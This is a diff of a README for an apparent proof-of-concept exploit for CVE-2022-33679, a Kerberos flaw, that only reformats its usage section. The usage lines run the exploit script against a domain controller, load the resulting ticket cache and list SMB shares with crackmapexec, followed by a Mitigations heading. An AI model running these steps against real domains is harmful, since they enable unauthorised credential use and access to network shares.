@@ -10,11 +10,11 @@
 
 ### Usage:
 
- - python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
+    python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
 
- - export KRB5CCNAME=/home/project/User.ccache
+    export KRB5CCNAME=/home/project/User.ccache
 
- - crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
+    crackmapexec smb DC01.DOMAIN.LOCAL -k --shares
 
 ## Mitigations
 
